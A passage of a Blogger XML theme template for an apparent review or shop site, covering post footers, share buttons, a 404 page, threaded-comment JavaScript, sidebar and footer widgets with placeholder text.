              <data:top.reactionsLabel/></span>&#160;</td>
            <td><iframe allowtransparency='true' class='reactions-iframe' expr:src='data:post.reactionsUrl' frameborder='0' name='reactions' scrolling='no'/></td>
           </tr></table>
        </b:if>
      </span>

      <span class='post-comment-link'>
        <b:include cond='data:blog.pageType not in {&quot;item&quot;,&quot;static_page&quot;}                          and data:post.allowComments' data='post' name='comment_count_picker'/>
      </span>

       <!-- backlinks -->
       <span class='post-backlinks post-comment-link'>
         <b:if cond='data:blog.pageType not in {&quot;item&quot;,&quot;static_page&quot;}                      and data:post.showBacklinks'>
           <a class='comment-link' expr:href='data:post.url + &quot;#links&quot;'><data:top.backlinkLabel/></a>
         </b:if>
       </span>

      <span class='post-icons'>
        <!-- email post links -->
        <b:if cond='data:post.emailPostUrl'>
          <span class='item-action'>
          <a expr:href='data:post.emailPostUrl' expr:title='data:top.emailPostMsg'>
            <img alt='' class='icon-action' height='13' src='//img1.blogblog.com/img/icon18_email.gif' width='18'/>
          </a>
          </span>
        </b:if>

        <!-- quickedit pencil -->
        <b:include data='post' name='postQuickEdit'/>
      </span>

      <!-- share buttons -->
      <div class='post-share-buttons goog-inline-block'>
        <b:include cond='data:post.sharePostUrl' data='post' name='shareButtons'/>
      </div>

      </div>

      <div class='post-footer-line post-footer-line-2'>
      <span class='post-labels'>
        <b:if cond='data:post.labels'>
          <data:postLabelsLabel/>
          <b:loop values='data:post.labels' var='label'>
            <a expr:href='data:label.url' rel='tag'><data:label.name/></a><b:if cond='not data:label.isLast'>,</b:if>
          </b:loop>
        </b:if>
      </span>
      </div>

      <div class='post-footer-line post-footer-line-3'>
      <span class='post-location'>
        <b:if cond='data:top.showLocation'>
          <b:if cond='data:post.location'>
            <data:postLocationLabel/>
            <a expr:href='data:post.location.mapsUrl' target='_blank'><data:post.location.name/></a>
          </b:if>
        </b:if>
      </span>
      </div>
      <b:if cond='data:post.authorAboutMe'>
        <div class='author-profile' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
          <b:if cond='data:post.authorPhoto.url'>
            <img expr:src='data:post.authorPhoto.url' itemprop='image' width='50px'/>
          </b:if>
          <div>
            <a class='g-profile' expr:href='data:post.authorProfileUrl' itemprop='url' rel='author' title='author profile'>
              <span itemprop='name'><data:post.author/></span>
            </a>
          </div>
          <span itemprop='description'><data:post.authorAboutMe/></span>
        </div>
      </b:if>
    </div>
   <b:if cond='data:blog.pageType == &quot;item&quot;'>
      &lt;/div&gt;
    </b:if>
  </div>
</b:includable>
       <b:includable id='postQuickEdit' var='post'>
  <b:if cond='data:post.editUrl'>
    <span expr:class='&quot;item-control &quot; + data:post.adminClass'>
      <a expr:href='data:post.editUrl' expr:title='data:top.editPostMsg'>
        <img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
      </a>
    </span>
  </b:if>
</b:includable>
       <b:includable id='shareButtons' var='post'>
  <b:if cond='data:top.showEmailButton'><a class='goog-inline-block share-button sb-email' expr:href='data:post.sharePostUrl + &quot;&amp;target=email&quot;' expr:title='data:top.emailThisMsg' target='_blank'><span class='share-button-link-text'><data:top.emailThisMsg/></span></a></b:if><b:if cond='data:top.showBlogThisButton'><a class='goog-inline-block share-button sb-blog' expr:href='data:post.sharePostUrl + &quot;&amp;target=blog&quot;' expr:onclick='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=270,width=475\&quot;); return false;&quot;' expr:title='data:top.blogThisMsg' target='_blank'><span class='share-button-link-text'><data:top.blogThisMsg/></span></a></b:if><b:if cond='data:top.showTwitterButton'><a class='goog-inline-block share-button sb-twitter' expr:href='data:post.sharePostUrl + &quot;&amp;target=twitter&quot;' expr:title='data:top.shareToTwitterMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToTwitterMsg/></span></a></b:if><b:if cond='data:top.showFacebookButton'><a class='goog-inline-block share-button sb-facebook' expr:href='data:post.sharePostUrl + &quot;&amp;target=facebook&quot;' expr:onclick='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=430,width=640\&quot;); return false;&quot;' expr:title='data:top.shareToFacebookMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToFacebookMsg/></span></a></b:if><b:if cond='data:top.showPinterestButton'><a class='goog-inline-block share-button sb-pinterest' expr:href='data:post.sharePostUrl + &quot;&amp;target=pinterest&quot;' expr:title='data:top.shareToPinterestMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToPinterestMsg/></span></a></b:if><b:if cond='data:top.showPlusOne'><div class='goog-inline-block google-plus-share-container'><data:post.googlePlusShareTag/></div></b:if>
</b:includable>
       <b:includable id='status-message'>
  <b:if cond='data:navMessage'>
  <div class='status-msg-wrap'>
    <div class='status-msg-body'>
      <data:navMessage/>
    </div>
    <div class='status-msg-border'>
      <div class='status-msg-bg'>
        <div class='status-msg-hidden'><data:navMessage/></div>
      </div>
    </div>
  </div>
  <div style='clear: both;'/>
  </b:if>
<b:if cond='data:blog.pageType == &quot;error_page&quot;'>
  <div class='post-404'>
<div class='actions-404'>
<div class='ops-404'><span>Oops;</span> Sorry, but the page you were trying to view does not exist.
                        </div>
<div class='title-404'>404</div>
<div class='link-404'>
<a href='/'><i class='fa fa-car'/>
<trans>Back to Home</trans></a>
</div></div>
</div>
<style>
.post-404 {
    padding-top: 40px;
    padding-bottom: 60px;
}
.actions-404 {
    width: 100%;
    float: right;
    text-align: center;
}
.ops-404 {
    width: 50%;
    margin: 0 auto;
    font-size: 26px;
    font-weight: 400;
letter-spacing:1.5px;
}
.ops-404 span {
    font-weight: 700;
}
.title-404 {
    font-size: 200px;
    font-weight: 700;
    line-height: 1.1;
    color:$maincolor;
}
.link-404 {
    font-size: 18px;
    padding-top: 20px;
    padding-bottom: 50px;
}
#blog-pager, #sidebar-wrapper,.status-msg-wrap {
    display: none;
}
.status-msg-border {
         border: 0 !important;
       }
       .status-msg-bg {
         background-color: #fff;
       }
#main-wrapper {
    float: none;
    width: 100%;
    max-width: 100%;
}
</style>
      </b:if>
</b:includable>
       <b:includable id='threaded-comment-form' var='post'>
  <div class='comment-form'>
    <a name='comment-form'/>
    <b:if cond='data:mobile'>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' expr:height='data:cmtIframeInitialHeight' frameborder='0' id='comment-editor' name='comment-editor' src='' style='display: none' width='100%'/>
    <b:else/>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' expr:height='data:cmtIframeInitialHeight' frameborder='0' id='comment-editor' name='comment-editor' src='' width='100%'/>
    </b:if>
    <data:post.cmtfpIframe/>
    <script type='text/javascript'>
      BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;);
    </script>
  </div>
</b:includable>
       <b:includable id='threaded_comment_js' var='post'>
  <script async='async' expr:src='data:post.commentSrc' type='text/javascript'/>

  <script type='text/javascript'>
    (function() {
      var items = <data:post.commentJso/>;
      var msgs = <data:post.commentMsgs/>;
      var config = <data:post.commentConfig/>;

// <![CDATA[
      var cursor = null;
      if (items && items.length > 0) {
        cursor = parseInt(items[items.length - 1].timestamp) + 1;
      }

      var bodyFromEntry = function(entry) {
        if (entry.gd$extendedProperty) {
          for (var k in entry.gd$extendedProperty) {
            if (entry.gd$extendedProperty[k].name == 'blogger.contentRemoved') {
              return '<span class="deleted-comment">' + entry.content.$t + '</span>';
            }
          }
        }
        return entry.content.$t;
      }

      var parse = function(data) {
        cursor = null;
        var comments = [];
        if (data && data.feed && data.feed.entry) {
          for (var i = 0, entry; entry = data.feed.entry[i]; i++) {
            var comment = {};
            // comment ID, parsed out of the original id format
            var id = /blog-(\d+).post-(\d+)/.exec(entry.id.$t);
            comment.id = id ? id[2] : null;
            comment.body = bodyFromEntry(entry);
            comment.timestamp = Date.parse(entry.published.$t) + '';
            if (entry.author && entry.author.constructor === Array) {
              var auth = entry.author[0];
              if (auth) {
                comment.author = {
                  name: (auth.name ? auth.name.$t : undefined),
                  profileUrl: (auth.uri ? auth.uri.$t : undefined),
                  avatarUrl: (auth.gd$image ? auth.gd$image.src : undefined)
                };
              }
            }
            if (entry.link) {
              if (entry.link[2]) {
                comment.link = comment.permalink = entry.link[2].href;
              }
              if (entry.link[3]) {
                var pid = /.*comments\/default\/(\d+)\?.*/.exec(entry.link[3].href);
                if (pid && pid[1]) {
                  comment.parentId = pid[1];
                }
              }
            }
            comment.deleteclass = 'item-control blog-admin';
            if (entry.gd$extendedProperty) {
              for (var k in entry.gd$extendedProperty) {
                if (entry.gd$extendedProperty[k].name == 'blogger.itemClass') {
                  comment.deleteclass += ' ' + entry.gd$extendedProperty[k].value;
                } else if (entry.gd$extendedProperty[k].name == 'blogger.displayTime') {
                  comment.displayTime = entry.gd$extendedProperty[k].value;
                }
              }
            }
            comments.push(comment);
          }
        }
        return comments;
      };

      var paginator = function(callback) {
        if (hasMore()) {
          var url = config.feed + '?alt=json&v=2&orderby=published&reverse=false&max-results=50';
          if (cursor) {
            url += '&published-min=' + new Date(cursor).toISOString();
          }
          window.bloggercomments = function(data) {
            var parsed = parse(data);
            cursor = parsed.length < 50 ? null
                : parseInt(parsed[parsed.length - 1].timestamp) + 1
            callback(parsed);
            window.bloggercomments = null;
          }
          url += '&callback=bloggercomments';
          var script = document.createElement('script');
          script.type = 'text/javascript';
          script.src = url;
          document.getElementsByTagName('head')[0].appendChild(script);
        }
      };
      var hasMore = function() {
        return !!cursor;
      };
      var getMeta = function(key, comment) {
        if ('iswriter' == key) {
          var matches = !!comment.author
              && comment.author.name == config.authorName
              && comment.author.profileUrl == config.authorUrl;
          return matches ? 'true' : '';
        } else if ('deletelink' == key) {
          return config.baseUri + '/delete-comment.g?blogID='
               + config.blogId + '&postID=' + comment.id;
        } else if ('deleteclass' == key) {
          return comment.deleteclass;
        }
        return '';
      };

      var replybox = null;
      var replyUrlParts = null;
      var replyParent = undefined;

      var onReply = function(commentId, domId) {
        if (replybox == null) {
          // lazily cache replybox, and adjust to suit this style:
          replybox = document.getElementById('comment-editor');
          if (replybox != null) {
            replybox.height = '250px';
            replybox.style.display = 'block';
            replyUrlParts = replybox.src.split('#');
          }
        }
        if (replybox && (commentId !== replyParent)) {
          replybox.src = '';
          document.getElementById(domId).insertBefore(replybox, null);
          replybox.src = replyUrlParts[0]
              + (commentId ? '&parentID=' + commentId : '')
              + '#' + replyUrlParts[1];
          replyParent = commentId;
        }
      };

      var hash = (window.location.hash || '#').substring(1);
      var startThread, targetComment;
      if (/^comment-form_/.test(hash)) {
        startThread = hash.substring('comment-form_'.length);
      } else if (/^c[0-9]+$/.test(hash)) {
        targetComment = hash.substring(1);
      }

      // Configure commenting API:
      var configJso = {
        'maxDepth': config.maxThreadDepth
      };
      var provider = {
        'id': config.postId,
        'data': items,
        'loadNext': paginator,
        'hasMore': hasMore,
        'getMeta': getMeta,
        'onReply': onReply,
        'rendered': true,
        'initComment': targetComment,
        'initReplyThread': startThread,
        'config': configJso,
        'messages': msgs
      };

      var render = function() {
        if (window.goog && window.goog.comments) {
          var holder = document.getElementById('comment-holder');
          window.goog.comments.render(holder, provider);
        }
      };

      // render now, or queue to render when library loads:
      if (window.goog && window.goog.comments) {
        render();
      } else {
        window.goog = window.goog || {};
        window.goog.comments = window.goog.comments || {};
        window.goog.comments.loadQueue = window.goog.comments.loadQueue || [];
        window.goog.comments.loadQueue.push(render);
      }
    })();
// ]]>
  </script>
</b:includable>
       <b:includable id='threaded_comments' var='post'>
  <div class='comments' id='comments'>
    <a name='comments'/>
   <div class='custom-title'>
       <h4>
        <b:if cond='data:post.numComments == 1'>
          1 Review:
        <b:else/>
          <data:post.numComments/> Reviews:
        </b:if>
      </h4>
    </div>

    <div class='comments-content'>
      <b:include cond='data:post.embedCommentForm' data='post' name='threaded_comment_js'/>
      <div id='comment-holder'>
         <data:post.commentHtml/>
      </div>
    </div>

    <p class='comment-footer'>
      <b:if cond='data:post.allowNewComments'>
        <b:include data='post' name='threaded-comment-form'/>
      <b:else/>
        <data:post.noNewCommentsText/>
      </b:if>
    </p>

    <b:if cond='data:showCmtPopup'>
      <div id='comment-popup'>
        <iframe allowtransparency='true' frameborder='0' id='comment-actions' name='comment-actions' scrolling='no'>
        </iframe>
      </div>
    </b:if>

    <div id='backlinks-container'>
    <div expr:id='data:widget.instanceId + &quot;_backlinks-container&quot;'>
      <b:include cond='data:post.showBacklinks' data='post' name='backlinks'/>
    </div>
    </div>
  </div>
</b:includable>
     </b:widget>
   </b:section>    

</div>
  <div id='sidebar-wrapper'>
<b:section class='sidebar deep-widget' id='sidebar' preferred='yes'>
  <b:widget id='Label1' locked='false' title='Categories' type='Label'>
    <b:widget-settings>
      <b:widget-setting name='sorting'>ALPHA</b:widget-setting>
      <b:widget-setting name='display'>LIST</b:widget-setting>
      <b:widget-setting name='selectedLabelsList'/>
      <b:widget-setting name='showType'>ALL</b:widget-setting>
      <b:widget-setting name='showFreqNumbers'>false</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
  <b:if cond='data:title != &quot;&quot;'>
    <h2><data:title/></h2>
  </b:if>
  <div expr:class='&quot;widget-content &quot; + data:display + &quot;-label-widget-content&quot;'>
    <b:if cond='data:display == &quot;list&quot;'>
      <ul>
        <b:loop values='data:labels' var='label'>
          <li>
            <b:if cond='data:blog.url == data:label.url'>
              <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
            <b:else/>
              <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
            </b:if>
            <b:if cond='data:showFreqNumbers'>
              <span dir='ltr'>(<data:label.count/>)</span>
            </b:if>
          </li>
        </b:loop>
      </ul>
    <b:else/>
      <b:loop values='data:labels' var='label'>
        <span expr:class='&quot;label-size label-size-&quot; + data:label.cssSize'>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span class='label-count' dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </span>
      </b:loop>
    </b:if>
    <b:include name='quickedit'/>
  </div>
</b:includable>
  </b:widget>
  <b:widget id='HTML9' locked='false' title='Recent Reviews' type='HTML'>
    <b:widget-settings>
      <b:widget-setting name='content'><![CDATA[<span class="recentcomments" data-no="4"></span>]]></b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

  <b:include name='quickedit'/>
</b:includable>
  </b:widget>
  <b:widget id='PopularPosts1' locked='false' title='Popular Items' type='PopularPosts' version='1'>
    <b:widget-settings>
      <b:widget-setting name='numItemsToShow'>5</b:widget-setting>
      <b:widget-setting name='showThumbnails'>true</b:widget-setting>
      <b:widget-setting name='showSnippets'>true</b:widget-setting>
      <b:widget-setting name='timeRange'>LAST_YEAR</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
                <b:if cond='data:title != &quot;&quot;'><h2><data:title/></h2></b:if>
                <div class='widget-content popular-posts'>
                  <ul>
                    <b:loop values='data:posts' var='post'>
                      <li>
                        <b:if cond='!data:showThumbnails'>
                          <b:if cond='!data:showSnippets'>
                            <!-- (1) No snippet/thumbnail -->
                            <a expr:href='data:post.href'><data:post.title/></a>
                            <b:else/>
                            <!-- (2) Show only snippets -->
                            <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
                            <div class='item-snippet'><data:post.snippet/></div>
                          </b:if>
                          <b:else/>
                          <!-- (3) Show only thumbnails or (4) Snippets and thumbnails. -->
                          <div expr:class='data:showSnippets ? &quot;item-content&quot; : &quot;item-thumbnail-only&quot;'>
                            <b:if cond='data:post.thumbnail'>
                              <div class='item-thumbnail'>
                                <a expr:href='data:post.href'>
                                  <img border='0' expr:alt='data:post.title' expr:height='data:thumbnailSize' expr:src='data:post.thumbnail' expr:width='data:thumbnailSize'/>
                                </a>
                              </div>
                            </b:if>
                            <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
                            <b:if cond='data:showSnippets'>
                              <div class='item-snippet'><data:post.snippet/></div>
                            </b:if>
                          </div>
                          <div style='clear: both;'/>
                        </b:if>
                      </li>
                    </b:loop>
                  </ul>
                  <b:include name='quickedit'/>
                </div>
              </b:includable>
  </b:widget>
</b:section>
    </div>
 <div style='clear: both;'/>
    </div>
    <!-- end content-wrapper -->
<div class='popular-product row'>
  <b:section class='pop-pro' id='pop-bot-bot' maxwidgets='1' name='Popular Products' showaddelement='yes'>
    <b:widget id='PopularPosts2' locked='true' title='Popular Products' type='PopularPosts'>
      <b:widget-settings>
        <b:widget-setting name='numItemsToShow'>4</b:widget-setting>
        <b:widget-setting name='showThumbnails'>true</b:widget-setting>
        <b:widget-setting name='showSnippets'>true</b:widget-setting>
        <b:widget-setting name='timeRange'>LAST_WEEK</b:widget-setting>
      </b:widget-settings>
      <b:includable id='main'>
  <b:if cond='data:title != &quot;&quot;'><h2><data:title/></h2></b:if>
  <div class='widget-content popular-posts'>
    <ul>
      <b:loop values='data:posts' var='post'>
      <li>
        <b:if cond='!data:showThumbnails'>
          <b:if cond='!data:showSnippets'>
            <!-- (1) No snippet/thumbnail -->
            <a expr:href='data:post.href'><data:post.title/></a>
          <b:else/>
            <!-- (2) Show only snippets -->
            <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
            <div class='item-snippet'><data:post.snippet/></div>
          </b:if>
        <b:else/>
          <!-- (3) Show only thumbnails or (4) Snippets and thumbnails. -->
          <div expr:class='data:showSnippets ? &quot;item-content&quot; : &quot;item-thumbnail-only&quot;'>
            <b:if cond='data:post.featuredImage.isResizable or data:post.thumbnail'>
              <div class='item-thumbnail'>
                <a expr:href='data:post.href' target='_blank'>
                  <b:with value='data:post.featuredImage.isResizable                                  ? resizeImage(data:post.featuredImage, 72, &quot;1:1&quot;)                                  : data:post.thumbnail' var='image'>
                    <img alt='' border='0' expr:src='data:image'/>
                  </b:with>
                </a>
              </div>
            </b:if>
            <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
            <b:if cond='data:showSnippets'>
              <div class='item-snippet'><data:post.snippet/></div>
            </b:if>
          </div>
          <div style='clear: both;'/>
        </b:if>
      </li>
      </b:loop>
    </ul>
    <b:include name='quickedit'/>
  </div>
</b:includable>
    </b:widget>
  </b:section>
</div>
<div style='clear: both;'/>
<div class='email-folower'>
<div class='row email-folower-wrap'>
  <b:section class='custom-email-follow' id='Email Subscription Widget' preferred='yes'>
    <b:widget id='FollowByEmail2' locked='false' title='Follow by Email' type='FollowByEmail'>
      <b:includable id='main'>
  <b:if cond='data:title != &quot;&quot;'><h2 class='title'><data:title/></h2></b:if>
  <div class='widget-content'>
    <div class='follow-by-email-inner'>
      <form action='https://feedburner.google.com/fb/a/mailverify' expr:onsubmit='&quot;window.open(\&quot;https://feedburner.google.com/fb/a/mailverify?uri=&quot; + data:feedPath + &quot;\&quot;, \&quot;popupwindow\&quot;, \&quot;scrollbars=yes,width=550,height=520\&quot;); return true&quot;' method='post' target='popupwindow'>
        <table width='100%'>
          <tr>
            <td>
              <input class='follow-by-email-address' name='email' placeholder='Email address...' type='text'/>
            </td>
            <td width='64px'>
              <input class='follow-by-email-submit' type='submit' value='Submit'/>
            </td>
          </tr>
        </table>
        <input expr:value='data:feedPath' name='uri' type='hidden'/>
        <input name='loc' type='hidden' value='en_US'/>
      </form>
    </div>
  </div>
  <span class='item-control blog-admin'>
    <b:include name='quickedit'/>
  </span>
</b:includable>
    </b:widget>
  </b:section>
  </div>
  </div>
<div id='lower'>
<div class='row' id='lower-wrapper'>
<div id='lowerbar-wrapper'>
<b:section class='lowerbar  deep-widget' id='Footer Widget (A)' preferred='yes'>
  <b:widget id='HTML5' locked='false' title='' type='HTML' version='1'>
    <b:widget-settings>
      <b:widget-setting name='content'>&lt;div style=&quot;margin-bottom:15px;&quot;&gt;
&lt;center&gt;&lt;img src=&quot;https://4.bp.blogspot.com/-a6up5GuQG8M/WofM2jDcEUI/AAAAAAAAANw/jhrcZLyQ7ts-6Fk2MmbKEUUdigojAIpeACLcBGAs/s1600/170_40.jpg&quot; alt=&quot;Click2Chor&quot; /&gt;
&lt;/center&gt;&lt;/div&gt;&lt;p style=&quot;text-align:justify&quot;&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla elementum viverra pharetra. Nulla facilisis, sapien non pharetra venenatis, tortor erat tempus est, sed accumsan odio ante ac elit./p&gt;
&lt;/p&gt;</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>
  <!--b:include name='quickedit'/-->
</b:includable>
  </b:widget>
  <b:widget id='HTML2' locked='false' title='Follow Us' type='HTML'>
    <b:widget-settings>
      <b:widget-setting name='content'>&lt;ul class=&quot;social-icons icon-circle list-unstyled list-inline&quot;&gt; 
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-facebook&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; 
       
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-google-plus&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; 
       
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-instagram&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; 
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-linkedin&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; 
       
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-pinterest&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt; 
      
  
       &lt;li&gt; &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-twitter&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
     
    &lt;/ul&gt;
&lt;style&gt;
.list-unstyled {
 padding-left: 0;
 list-style: none;
}
.list-inline li {
     display: inline-block;
    padding-right: 1px;
    padding-left: 1px;
    margin-bottom: 5px;
}
/*---- Genral classes end -------*/

/*Change icons size here*/
.social-icons .fa {
 font-size: 1.8em;
}
/*Change icons circle size and color here*/
.social-icons .fa {
 width: 48px;
 height: 48px;
 line-height: 48px;
 text-align: center;
 color: #FFF;
 color: rgba(255, 255, 255, 0.8);
 -webkit-transition: all 0.3s ease-in-out;
 -moz-transition: all 0.3s ease-in-out;
 -ms-transition: all 0.3s ease-in-out;
 -o-transition: all 0.3s ease-in-out;
 transition: all 0.3s ease-in-out;
}

.social-icons.icon-circle .fa{ 
 border-radius: 50%;
}
.social-icons.icon-rounded .fa{
 border-radius:5px;
}
.social-icons.icon-flat .fa{
 border-radius: 0;
}

.social-icons .fa:hover, .social-icons .fa:active {
 color: #FFF;
 -webkit-box-shadow: 1px 1px 3px #333;
 -moz-box-shadow: 1px 1px 3px #333;
 box-shadow: 1px 1px 3px #333; 
}

 
.social-icons .fa-adn{background-color:#504e54;} 
.social-icons .fa-apple{background-color:#aeb5c5;} 
.social-icons .fa-android{background-color:#A5C63B;}  
.social-icons .fa-bitbucket,.social-icons .fa-bitbucket-square{background-color:#003366;} 
.social-icons .fa-bitcoin,.social-icons .fa-btc{background-color:#F7931A;} 
.social-icons .fa-css3{background-color:#1572B7;} 
.social-icons .fa-dribbble{background-color:#F46899;}  
.social-icons .fa-dropbox{background-color:#018BD3;}
.social-icons .fa-facebook,.social-icons .fa-facebook-square{background-color:#3C599F;}  
.social-icons .fa-flickr{background-color:#FF0084;}
.social-icons .fa-foursquare{background-color:#0086BE;}
.social-icons .fa-github,.social-icons .fa-github-alt,.social-icons .fa-github-square{background-color:#070709;} 
.social-icons .fa-google-plus,.social-icons .fa-google-plus-square{background-color:#CF3D2E;} 
.social-icons .fa-html5{background-color:#E54D26;}
.social-icons .fa-instagram{background-color:#A1755C;}
.social-icons .fa-linkedin,.social-icons .fa-linkedin-square{background-color:#0085AE;} 
.social-icons .fa-linux{background-color:#FBC002;color:#333;}
.social-icons .fa-maxcdn{background-color:#F6AE1C;}
.social-icons .fa-pagelines{background-color:#241E20;color:#3984EA;}
.social-icons .fa-pinterest,.social-icons .fa-pinterest-square{background-color:#CC2127;} 
.social-icons .fa-renren{background-color:#025DAC;}
.social-icons .fa-skype{background-color:#01AEF2;}
.social-icons .fa-stack-exchange{background-color:#245590;}
.social-icons .fa-stack-overflow{background-color:#FF7300;}
.social-icons .fa-trello{background-color:#265A7F;}
.social-icons .fa-tumblr,.social-icons .fa-tumblr-square{background-color:#314E6C;} 
.social-icons .fa-twitter,.social-icons .fa-twitter-square{background-color:#32CCFE;} 
.social-icons .fa-vimeo-square{background-color:#229ACC;}
.social-icons .fa-vk{background-color:#375474;}
.social-icons .fa-weibo{background-color:#D72B2B;}
.social-icons .fa-windows{background-color:#12B6F3;}
.social-icons .fa-xing,.social-icons .fa-xing-square{background-color:#00555C;} 
.social-icons .fa-youtube,.social-icons .fa-youtube-play,.social-icons .fa-youtube-square{background-color:#C52F30;}
&lt;/style&gt;</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

  <b:include name='quickedit'/>
</b:includable>
  </b:widget>
</b:section>
</div>
<div id='lowerbar-wrapper'>
<b:section class='lowerbar  deep-widget' id='Footer Widget (B)' preferred='yes'>
  <b:widget id='Label4' locked='false' title='Products' type='Label'>
    <b:widget-settings>
      <b:widget-setting name='sorting'>ALPHA</b:widget-setting>
      <b:widget-setting name='display'>CLOUD</b:widget-setting>
      <b:widget-setting name='selectedLabelsList'/>
      <b:widget-setting name='showType'>ALL</b:widget-setting>
      <b:widget-setting name='showFreqNumbers'>false</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
  <b:if cond='data:title != &quot;&quot;'>
    <h2><data:title/></h2>
  </b:if>
  <div expr:class='&quot;widget-content &quot; + data:display + &quot;-label-widget-content&quot;'>
    <b:if cond='data:display == &quot;list&quot;'>
      <ul>
        <b:loop values='data:labels' var='label'>
          <li>
            <b:if cond='data:blog.url == data:label.url'>
              <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
            <b:else/>
              <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
            </b:if>
            <b:if cond='data:showFreqNumbers'>
              <span dir='ltr'>(<data:label.count/>)</span>
            </b:if>
          </li>
        </b:loop>
      </ul>
    <b:else/>
      <b:loop values='data:labels' var='label'>
        <span expr:class='&quot;label-size label-size-&quot; + data:label.cssSize'>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span class='label-count' dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </span>
      </b:loop>
    </b:if>
    <b:include name='quickedit'/>
  </div>
</b:includable>
  </b:widget>
  <b:widget id='LinkList1' locked='false' title='Links' type='LinkList'>
    <b:widget-settings>
      <b:widget-setting name='sorting'>NONE</b:widget-setting>
      <b:widget-setting name='text-1'>About Us</b:widget-setting>
      <b:widget-setting name='link-1'>#</b:widget-setting>
      <b:widget-setting name='text-0'>FAQ</b:widget-setting>
      <b:widget-setting name='link-2'>#</b:widget-setting>
      <b:widget-setting name='link-0'>#</b:widget-setting>
      <b:widget-setting name='text-2'>Contact Us</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>

<b:if cond='data:title != &quot;&quot;'><h2><data:title/></h2></b:if>
 <div class='widget-content'>
   <ul>
     <b:loop values='data:links' var='link'>
       <li><a expr:href='data:link.target'><data:link.name/></a></li>
     </b:loop>
   </ul>
   <b:include name='quickedit'/>
 </div>
</b:includable>
  </b:widget>
</b:section>
</div>
<div id='lowerbar-wrapper'>
<b:section class='lowerbar  deep-widget' id='Footer Widget (c)' preferred='yes'>
  <b:widget id='HTML3' locked='false' title='Contact Us' type='HTML'>
    <b:widget-settings>
      <b:widget-setting name='content'>&lt;div class=&quot;footer-contact&quot;&gt;
                                        &lt;p class=&quot;adress&quot;&gt;&lt;label&gt;Head Office:&lt;/label&gt;&lt;span class=&quot;ft-content&quot;&gt;3-10/c
ameerpet, Hyderabad,
&lt;br /&gt; 500016.&lt;/span&gt;&lt;/p&gt;
                                        &lt;p class=&quot;adress&quot;&gt;&lt;label&gt;Branch Office:&lt;/label&gt;&lt;span class=&quot;ft-content&quot;&gt;62 Friar Street, CLEUCH HEAD,&lt;br /&gt; TD9 5BR.&lt;/span&gt;&lt;/p&gt;
